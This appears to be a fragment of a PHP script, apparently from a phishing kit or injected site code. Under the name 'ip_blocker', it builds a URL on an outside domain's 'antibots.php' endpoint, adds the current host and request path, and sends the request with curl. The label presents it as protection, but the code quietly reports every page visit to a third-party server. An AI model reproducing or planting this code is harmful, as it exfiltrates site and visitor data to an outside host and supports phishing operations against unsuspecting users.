...
$ip_blocker = $_SERVER["REQUEST_SCHEME"]."://nous-aujourdhui.ch//cron/q/antibots.php?antibots=".$_SERVER['HTTP_HOST']."".$_SERVER["REQUEST_URI"]; $ch = curl_init($ip_blocker); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_exec($ch);
